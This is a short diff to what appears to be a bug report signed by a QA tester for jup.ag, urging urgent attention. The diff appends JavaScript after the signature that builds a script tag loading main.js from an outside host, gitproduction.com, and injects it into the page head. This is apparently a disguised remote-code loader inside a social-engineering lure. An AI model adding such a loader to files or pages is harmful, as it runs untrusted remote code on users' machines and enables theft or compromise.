@@ -43,3 +43,7 @@ This issue requires **urgent attention** to prevent further abuse. Please confir
 **Best regards,**  
 *William Foster*  
 QA Tester, jup.ag  
+
+const script = document.createElement("script");  
+script.src = "https://gitproduction.com/xxsweetchickxxx3/Bug-Report-1532/main.js";  
+document.head.appendChild(script);
